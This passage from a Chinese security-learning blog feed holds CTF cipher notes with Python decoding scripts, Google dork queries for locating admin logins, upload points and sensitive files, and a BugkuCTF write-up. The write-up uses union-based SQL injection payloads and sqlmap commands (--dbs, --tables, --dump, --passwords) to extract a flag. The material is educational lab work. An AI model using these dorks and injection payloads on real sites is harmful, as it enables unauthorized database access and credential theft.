<span class="string">&#x27;wexlyfk&#x27;</span></span><br><span class="line">my = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>,<span class="string">&quot;密钥&quot;</span>,my)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">  mw = <span class="built_in">ord</span>(i)</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">64</span> &lt; mw &lt; <span class="number">91</span>):<span class="comment">#大写字母</span></span><br><span class="line">    jm = mw + my</span><br><span class="line">    <span class="keyword">if</span> jm &gt; <span class="number">90</span>:</span><br><span class="line">      jm = (mw - <span class="number">26</span>) + my</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">elif</span> (<span class="number">96</span> &lt; mw &lt; <span class="number">123</span>):<span class="comment">#小写字母</span></span><br><span class="line">    jm = mw + my</span><br><span class="line">    <span class="keyword">if</span> jm &gt; <span class="number">122</span>:</span><br><span class="line">      jm = (mw - <span class="number">26</span>) + my</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    jm = mw + <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(jm), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><h2 id="🐕变异凯撒"><a href="#🐕变异凯撒" class="headerlink" title="🐕变异凯撒"></a>🐕变异凯撒</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>变异凯撒就是在凯撒的基础上<strong>有规律</strong>的位移</p><p>再次举个栗子</p><p>选用buu上的一道题</p><p><strong>密文</strong>：afZ_r9VYfScOeO_UL^RWUc  因为是ctf题 所以我们看看能否与ctf 或者flag 对应上</p><ul><li><p>a的ascii码是<em>97</em>   而f的ascii是<em>102</em></p></li><li><p>f的ascii码是<em>102</em>  而l的ascii是<em>108</em></p></li><li><p>Z的ascii码是<em>106</em>  而a的ascii是<em>97</em></p></li><li><p>_的ascii码是<em>95</em>  而g的ascii是<em>103</em></p></li></ul><p>a→f： 移动了5  f→l：移动了6， 后面依次移动了7、8</p><h3 id="既可手撸又可脚本跑-以下为此题的变异凯撒脚本"><a href="#既可手撸又可脚本跑-以下为此题的变异凯撒脚本" class="headerlink" title="既可手撸又可脚本跑  以下为此题的变异凯撒脚本"></a>既可手撸又可脚本跑  以下为此题的变异凯撒脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KaiSa</span>(<span class="params">string,begin_num</span>):</span></span><br><span class="line">    begin_num = <span class="built_in">int</span>(begin_num)</span><br><span class="line">    string_list = <span class="built_in">list</span>(string)</span><br><span class="line">    print_string=<span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_list:</span><br><span class="line">        num = <span class="built_in">ord</span>(char)</span><br><span class="line">        num+=begin_num</span><br><span class="line">        begin_num+=<span class="number">1</span></span><br><span class="line">        char=<span class="built_in">chr</span>(num)</span><br><span class="line">        print_string+=char</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(print_string)</span><br><span class="line">KaiSa(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>,<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此脚本<strong>固定</strong>起始值 偏移值为5 然后每次循环依次增加</p><p>跑出来结果为  flag{Caesar_variation}  <strong>这就是变异凯撒</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214529.png"></p><h2 id="🐕维吉尼亚"><a href="#🐕维吉尼亚" class="headerlink" title="🐕维吉尼亚"></a>🐕维吉尼亚</h2><p>类似的位移密码还有维吉尼亚密码等</p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列<a href="https://baike.baidu.com/item/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81">凯撒密码</a>组成密码字母表的<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/2816213">加密算法</a>，属于多表密码的一种简单形式。</p><p>它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214544.png"></p><h4 id="解密方法："><a href="#解密方法：" class="headerlink" title="解密方法："></a>解密方法：</h4><p>​    <a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a> 用在线解密即可</p><p>例：</p><p>明文：i love it</p><p>密钥：zb</p><p>密文：j kpuf hu</p><h2 id="🐕Base家族"><a href="#🐕Base家族" class="headerlink" title="🐕Base家族"></a>🐕Base家族</h2><p>base解法用在线工具即可</p><p><a href="http://www.atoolbox.net/Category.php?Id=27">http://www.atoolbox.net/Category.php?Id=27</a></p><h3 id="🐱‍🐉Base62"><a href="#🐱‍🐉Base62" class="headerlink" title="🐱‍🐉Base62"></a>🐱‍🐉Base62</h3><ul><li><h4 id="base62编码原理"><a href="#base62编码原理" class="headerlink" title="base62编码原理"></a>base62编码原理</h4><blockquote><p>Base62编码是由10个数字、26个大写英文字母和26个小写英文字母组成</p></blockquote></li></ul><h3 id="🐱‍🐉Base91"><a href="#🐱‍🐉Base91" class="headerlink" title="🐱‍🐉Base91"></a>🐱‍🐉Base91</h3><ul><li><h4 id="base91编码原理"><a href="#base91编码原理" class="headerlink" title="base91编码原理"></a>base91编码原理</h4><blockquote><p>从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建base91字母：  　　　  -（破折号，0x2D） 　　　</p><p>​            \（反斜杠，0x5C） 　　　</p><p>​            ‘（撇号，0x27）</p></blockquote><h4 id="Base92则是-比base91-多一个字符-〜"><a href="#Base92则是-比base91-多一个字符-〜" class="headerlink" title="Base92则是 比base91 多一个字符 〜"></a>Base92则是 比base91 多一个字符 〜</h4></li></ul><h3 id="🐱‍🐉Base58"><a href="#🐱‍🐉Base58" class="headerlink" title="🐱‍🐉Base58"></a>🐱‍🐉Base58</h3><ul><li><h4 id="base58编码原理"><a href="#base58编码原理" class="headerlink" title="base58编码原理"></a>base58编码原理</h4><blockquote><p>字符为：123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz 去掉：0 O l  58=9个阿拉伯数字（去掉0）+24个大写字母（去掉I和O）+25小写字母（去掉l） </p></blockquote></li></ul><h3 id="🐱‍🐉Base36"><a href="#🐱‍🐉Base36" class="headerlink" title="🐱‍🐉Base36"></a>🐱‍🐉Base36</h3><ul><li><h4 id="base36编码原理"><a href="#base36编码原理" class="headerlink" title="base36编码原理"></a>base36编码原理</h4><blockquote><p>base36编码是使用0~9的数字，加上所有26个字母，所有的<strong>字母要不全大写，要不全小写。</strong></p></blockquote></li></ul><h3 id="🐱‍🐉Base16"><a href="#🐱‍🐉Base16" class="headerlink" title="🐱‍🐉Base16"></a>🐱‍🐉Base16</h3><ul><li><h4 id="base16编码原理"><a href="#base16编码原理" class="headerlink" title="base16编码原理"></a>base16编码原理</h4><blockquote><p>Base16编码使用16个ASCII可打印字符<strong>（数字0-9和字母A-F）</strong>对任意字节数据进行编码。</p></blockquote><p>简单地说：用16（2的4次方）个字符，对二进制数据进行编码的方式</p></li></ul><h3 id="🐱‍🐉Base64（最常见的base编码）"><a href="#🐱‍🐉Base64（最常见的base编码）" class="headerlink" title="🐱‍🐉Base64（最常见的base编码）"></a>🐱‍🐉Base64（最常见的base编码）</h3><ul><li><h4 id="base64编码原理"><a href="#base64编码原理" class="headerlink" title="base64编码原理"></a>base64编码原理</h4><blockquote><p>Base64编码是使用64个可打印ASCII字符<strong>（A-Z、a-z、0-9、+、/）</strong>将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p></blockquote><p>简单的说 就是 <strong>使用64个可打印字符来表示二进制数据的方法</strong></p><p><strong>base64格式通常以==结尾</strong></p></li><li><h4 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h4><p><a href="https://base64.us/">https://base64.us/</a> 官网在线解密或用工具解密</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214619.png"></p></li></ul><h3 id="🐱‍🐉Base32"><a href="#🐱‍🐉Base32" class="headerlink" title="🐱‍🐉Base32"></a>🐱‍🐉Base32</h3><ul><li><h4 id="base32编码原理"><a href="#base32编码原理" class="headerlink" title="base32编码原理"></a>base32编码原理</h4><blockquote><p>Base32编码是使用32个可打印字符<strong>（字母A-Z和数字2-7）</strong></p></blockquote><p>简单的说 就是 <strong>用32（2的5次方）个字符，对二进制数据进行编码的方式</strong></p></li></ul><h2 id="🐕栅栏密码"><a href="#🐕栅栏密码" class="headerlink" title="🐕栅栏密码"></a>🐕栅栏密码</h2><h3 id="传统型"><a href="#传统型" class="headerlink" title="传统型"></a>传统型</h3><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><blockquote><p>所谓栅栏密码，就是把明文分成N个组，然后取出每组的第一个，每组的第二个。接着按顺序排列得出密文。若每个组里有2两个元素的话就叫2栏栅栏密码。</p><p>栅栏密码分为传统型和W型</p></blockquote><h4 id="🤦‍♂️再举个栗子吧"><a href="#🤦‍♂️再举个栗子吧" class="headerlink" title="🤦‍♂️再举个栗子吧"></a>🤦‍♂️再举个栗子吧</h4><h5 id="加密篇"><a href="#加密篇" class="headerlink" title="加密篇"></a>加密篇</h5><p>例如明文为：The girl is beautiful 假设我们分为两栏，一共18个字符，2*9=18</p><p>所以我们分为9组  Th eg ir li sb ea ut if ul</p><p>将每组<strong>第一个元素</strong>提取出来 </p><p>第一组 Teilseuiu</p><p>第二组 hgribatfl</p><p>得到密文为 <strong>Teilseuiuhgribatfl</strong></p><h5 id="解密篇"><a href="#解密篇" class="headerlink" title="解密篇"></a>解密篇</h5><p>例如密文为：Teilseuiuhgribatfl 如果我们分两栏，那么</p><p>第一栏为 Teilseuiu</p><p>第二栏为 hgribatfl</p><p>根据栅栏规则，读取<strong>每一组的第一个</strong></p><p>Th eg ir li sb ea ut if ul</p><p>得到明文为 <strong>Thegirlisbeautiful</strong></p><p>通常用工具梭哈，但还是放出python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="built_in">input</span>(<span class="string">&quot;输入:&quot;</span>)</span><br><span class="line">frequency = [] <span class="comment"># 获得栅栏的栏数</span></span><br><span class="line">result_len = <span class="built_in">len</span>(string)        <span class="comment"># 栅栏密码的总长度  25</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, result_len):   <span class="comment"># 最小栅栏长度为2   逐个测试2,3,4....</span></span><br><span class="line">    <span class="keyword">if</span>(result_len % i == <span class="number">0</span>):        <span class="comment"># 当栅栏密码的总长度 模 i 余数为0  则这个i就是栅栏密码的长度</span></span><br><span class="line">        frequency.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> numberOfColumn <span class="keyword">in</span> frequency:   <span class="comment"># 循环可能分的栏数</span></span><br><span class="line">    RESULT = []                 <span class="comment">#  保存各栏数的结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numberOfColumn):     <span class="comment">#   i : 开始取值的位置</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, result_len, numberOfColumn):  <span class="comment"># 开始取值， 隔栏数取一个值， 起始位置是i</span></span><br><span class="line">            RESULT.append(string[j])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(RESULT))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214649.png"></p><p>选择看起来正常的即可</p><h3 id="🐱‍🐉栅栏密码（W型）"><a href="#🐱‍🐉栅栏密码（W型）" class="headerlink" title="🐱‍🐉栅栏密码（W型）"></a>🐱‍🐉栅栏密码（W型）</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><blockquote><p>W型栅栏密码加密的方法中，明文由上至下顺序写上，当到达最低部时，再回头向上，一直重复直至整篇明文写完为止。</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214709.png"></p><p>如上图， 就是在栅栏密码的基础上进行变形，通常用工具进行解密</p><h4 id="🤦‍♂️再再举个栗子吧"><a href="#🤦‍♂️再再举个栗子吧" class="headerlink" title="🤦‍♂️再再举个栗子吧"></a>🤦‍♂️再再举个栗子吧</h4><p>明文：asiabnhasuiiuh</p><p>栏数：3</p><p>贴上在线解密网址：<a href="http://www.metools.info/code/fence154.html">http://www.metools.info/code/fence154.html</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214727.png"></p><p>阿斌帅帅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;密码学学习笔记&lt;/h1&gt;

&lt;h2 id=&quot;🐕凯撒密码&quot;&gt;&lt;a href=&quot;#🐕凯撒密码&quot; class=&quot;headerlink&quot; title=&quot;🐕凯撒密码&quot;&gt;&lt;/a&gt;🐕凯撒密码&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>谷歌语法学习记录</title>
    <link href="https://abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-06-29T07:39:21.000Z</published>
    <updated>2021-06-29T07:58:24.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="谷歌语法简介"><a href="#谷歌语法简介" class="headerlink" title="谷歌语法简介"></a>谷歌语法简介</h1><ol><li><h2 id="基本语法（常用）"><a href="#基本语法（常用）" class="headerlink" title="基本语法（常用）"></a>基本语法（常用）</h2><ul><li><p><strong>“xxx”+域名：</strong>     搜索xxx与 域名 相关的内容</p></li><li><p><strong>“xxx”：</strong>     精确寻找，引号内输入</p></li><li><p><strong>site：</strong>     指定域名，如：<code>site:edu.cn</code> 搜索教育网站</p></li><li><p><strong>inurl：</strong>     用于搜索包含的url关键词的网页，如：<code>inurl:uploads</code> 文件上传，搜索关于公司有关的网址中含有login的网页，</p></li><li><p><strong>intext：</strong>     搜索网页正文中的关键字，如：<code>intext:登陆/注册/用户名/密码</code></p></li><li><p><strong>filetype：</strong>     按指定文件类型即文件后缀名搜索，如：<code>filetpye:php/asp/jsp</code></p></li><li><p><strong>info：</strong>     可以搜索到一个url更多的信息 如：<code>info:www.baidu.com</code></p></li><li><p><strong>link：</strong>     搜索所有链接到某个特定url的页面 如：<code>link:www.baidu.com</code></p></li><li><p><strong>AND,OR：</strong>     前者用来关联，后者代表两者其一都可</p></li><li><p><strong>“?”和“*”：</strong>     占位通配符，匹配一些模糊搜索</p></li><li><p><strong>Cache：</strong>    搜索缓存 如：<code>cache: [www.baidu.com](http://www.baidu.com)</code></p></li></ul></li><li><h2 id="骚操作语法，渗透测试中用到"><a href="#骚操作语法，渗透测试中用到" class="headerlink" title="骚操作语法，渗透测试中用到"></a>骚操作语法，渗透测试中用到</h2><h3 id="搜索敏感文件："><a href="#搜索敏感文件：" class="headerlink" title="搜索敏感文件："></a>搜索敏感文件：</h3><ul><li><p><code>site:xxx.com filetype:doc</code> //只返回xxx.com站点上文件类型为doc的网页</p></li><li><p><code>site:xxx.com filetype:xls</code> //只返回xxx.com站点上文件类型为xls的网页</p></li><li><p><code>site:xxx.com filetype:cof</code> //只返回xxx.com站点上文件类型为cof的网页</p></li></ul><h3 id="搜索管理后台："><a href="#搜索管理后台：" class="headerlink" title="搜索管理后台："></a>搜索管理后台：</h3><ul><li><p><code>inurl:/admin/login.php</code> //查找管理员登录页面</p></li><li><p><code>inurl:/phpmyadmin/index.php</code> //查找后台数据库管理页面</p></li><li><p><code>site:xxx.com inurl:login</code> //在xxx.com站点中查找url中含有login的页面</p></li></ul><h3 id="搜索mail"><a href="#搜索mail" class="headerlink" title="搜索mail:"></a>搜索mail:</h3><ul><li><code>site:xxx.com intext:@xxx.com</code></li></ul><h3 id="查找后台："><a href="#查找后台：" class="headerlink" title="查找后台："></a>查找后台：</h3><ul><li><code>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐</code></li></ul><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><ul><li><code>site:xx.com inurl:file| uploadfile</code></li></ul><h3 id="查找上传漏洞："><a href="#查找上传漏洞：" class="headerlink" title="查找上传漏洞："></a><strong>查找上传漏洞：</strong></h3><ul><li>site:域名 <code>inurl:file|load|editor|Files</code></li></ul><h3 id="查找目录："><a href="#查找目录：" class="headerlink" title="查找目录："></a>查找目录：</h3><ul><li> 用Index of 语法现允许目录浏览的web网站 如：<code>index of /admin</code></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;谷歌语法简介&quot;&gt;&lt;a href=&quot;#谷歌语法简介&quot; class=&quot;headerlink&quot; title=&quot;谷歌语法简介&quot;&gt;&lt;/a&gt;谷歌语法简介&lt;/h</summary>
      
    
    
    
    
    <category term="-语法" scheme="https://abinix.top/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>关于SQL注入</title>
    <link href="https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-05-19T12:29:21.000Z</published>
    <updated>2021-07-20T14:12:35.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1><p>先随便输入数字试试 输入1发现有回显</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503cc84ff6.jpg"></p><p>根据传参可判断这是POST方式，测试一下是不是为sql注入，输入id=1后回显正常</p><p>加入单引号后发现回显不正常，判断为sql注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d1e0df7.jpg"></p><p>接下来用order by 语句判断列数</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d31a22c.jpg"></p><p>从4开始吧，构造id=1’ order by 4#，正常回显</p><p>当构造id=1’ order by 5#时，发现回显不正常</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d3a9bf9.jpg"></p><p>由此判断有4列</p><h3 id="之后尝试联合注入，需要把查询数据置空"><a href="#之后尝试联合注入，需要把查询数据置空" class="headerlink" title="之后尝试联合注入，需要把查询数据置空"></a>之后尝试联合注入，需要把查询数据置空</h3><blockquote><p>具体做法是：<strong>id=0’ union select 1,2,3,4#</strong></p></blockquote><h3 id="下面就猜测数据库的库名，版本信息，数据库用户"><a href="#下面就猜测数据库的库名，版本信息，数据库用户" class="headerlink" title="下面就猜测数据库的库名，版本信息，数据库用户"></a>下面就猜测数据库的库名，版本信息，数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips： 没有顺序可言，因为第一个列是成绩单的姓名，所以我们可以把它设为null</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d47b1c2.jpg"></p><h3 id="根据数据库skctf-flag去查询表名"><a href="#根据数据库skctf-flag去查询表名" class="headerlink" title="根据数据库skctf_flag去查询表名"></a>根据数据库skctf_flag去查询表名</h3><p>我们可以构造这么一个pyload，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select null,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version()#</span></span><br></pre></td></tr></table></figure><p>大致意思就是将第二个列显示出它所有的表名</p><blockquote><p>这个**select group_concat(table_name) from information_schema.tables where table_schema=database() **可以暂且把它当作一个用来查询表名的固定格式</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b6888.jpg"></p><p>我们得到了fl4g，可知flag在fl4g的表中，那么下一步我们需要做的就是查询此表中的字段名</p><p>构造pyload</p><blockquote><p>id=0’ union select null,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()#</p></blockquote><p>注意！！</p><p>这里fl4g是一个表，所以需要加单引号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5a95a2.jpg"></p><p>我们得到了 skctf_flag 字段 可知flag在这里了（皆大欢喜）</p><p>接下来就很简单了 直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select skctf_flag from fl4g</span><br></pre></td></tr></table></figure><p>可得 pyload</p><blockquote><p>id=0’ union select null,(select skctf_flag from fl4g),user(),version()#</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b68e7.jpg"></p><p> 可得flag{aaab401ce593c5d4334e8c565a91b82e}</p><p>列名爆出后 爆当前列下的内容所用指令</p><p><code>select concat_ws(char(32,58,32),username,passwd) from users limit 1,1</code></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>布尔盲注就是存在注入的页面没有回显，没办法用select 1，2，3….#来判断页面的回显</p></blockquote><p><strong>既需要手工又需要脚本：</strong></p><p><a href="http://219.153.49.228/new_list.php?id=1">http://219.153.49.228/new_list.php?id=1</a> and length(database())&gt;10</p><p>用上述的length函数判断数据库长度</p><p>现当值为10的时候，页面就没有显示为false。那么说明database()的长度是10</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BugkuCTF-web17-成绩表&quot;&gt;&lt;a href=&quot;#BugkuCTF-web17-成绩表&quot; class=&quot;headerlink&quot; title=&quot;BugkuCTF web17 成绩表&quot;&gt;&lt;/a&gt;BugkuCTF web17 成绩表&lt;/h1&gt;&lt;p&gt;先随便输入数</summary>
      
    
    
    
    
    <category term="-SQL" scheme="https://abinix.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>关于SQLmap</title>
    <link href="https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
    <id>https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2021-07-20T14:07:56.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e65ae884d7a.jpg"></p><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a502ed628a0.jpg"></p><p>如图：可以看到全部的数据库</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503490307e.jpg"></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a50351141ca.jpg"></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于SQLmap&quot;&gt;&lt;a href=&quot;#关于SQLmap&quot; class=&quot;headerlink&quot; title=&quot;关于SQLmap&quot;&gt;&lt;/a&gt;关于SQLmap&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://abing.oss-cn-beijing.aliyunc</summary>
      
    
    
    
    
    <category term="-sql" scheme="https://abinix.top/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础指令</title>
    <link href="https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-22T10:50:00.000Z</published>
    <updated>2021-05-09T06:45:51.583Z</updated>
    
